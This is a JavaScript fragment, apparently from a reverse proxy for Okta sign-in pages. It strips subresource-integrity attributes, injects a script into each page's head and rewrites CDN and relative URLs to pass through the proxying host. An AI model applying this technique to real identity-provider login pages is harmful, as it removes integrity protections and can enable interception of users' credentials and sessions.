  result = result.replace(/\.integrity\s*=\s*"[^"]*"/gim, '.integrity = ""');
  result = result.replace(/\.crossOrigin\s*=\s*'[^']*'/gim, '.crossOrigin = ""');
  result = result.replace(/\.crossOrigin\s*=\s*"[^"]*"/gim, '.crossOrigin = ""');
  
  // Inject proxy script right after <head>
  const proxyScript = getProxyInjectionScript(oktaDomain, originalHost, originalProtocol);
  if (result.includes('<head')) {
    result = result.replace(/<head([^>]*)>/i, `<head$1>${proxyScript}`);
  } else if (result.includes('<html')) {
    // Fallback: inject after <html> if no <head>
    result = result.replace(/<html([^>]*)>/i, `<html$1><head>${proxyScript}</head>`);
  }
  
  // Rewrite CDN URLs in script/link src attributes ONLY
  // We're careful not to rewrite URLs in JavaScript code/data as it can break OAuth
  for (const cdn of oktaCdnDomains) {
    const cdnEscaped = escapeRegex(cdn);
    const cdnBaseUrl = `${originalProtocol}//${originalHost}/okta/${cdn}`;
    // Only rewrite in src= and href= attributes
    result = result
      .replace(new RegExp(`(src|href)="https://${cdnEscaped}`, 'g'), `$1="${cdnBaseUrl}`)
      .replace(new RegExp(`(src|href)='https://${cdnEscaped}`, 'g'), `$1='${cdnBaseUrl}`);
  }
  
  // Rewrite relative URLs in href/src/action attributes ONLY
  // This ensures navigation works but doesn't break OAuth redirect_uri
  result = result
    .replace(/(href|src|action)="\/(?!\/|okta\/)/g, `$1="/okta/${oktaDomain}/`)
    .replace(/(href|src|action)='\/(?!\/|okta\/)/g, `$1='/okta/${oktaDomain}/`);
  
  // NOTE: We intentionally do NOT do blanket URL rewriting for Okta domain
  // because it breaks OAuth redirect_uri values. The client-side script handles
  // dynamic URL rewriting for fetch/XHR/navigation.

  return result;
}

function rewriteCdnContent(content, oktaDomain, originalHost, originalProtocol) {
  // For generic CDN content, apply both CSS and JS rewrites
  let result = content;
  result = rewriteCssContent(result, oktaDomain, originalHost, originalProtocol, null);
  result = rewriteJsContent(result, oktaDomain, originalHost, originalProtocol);
  return result;
}
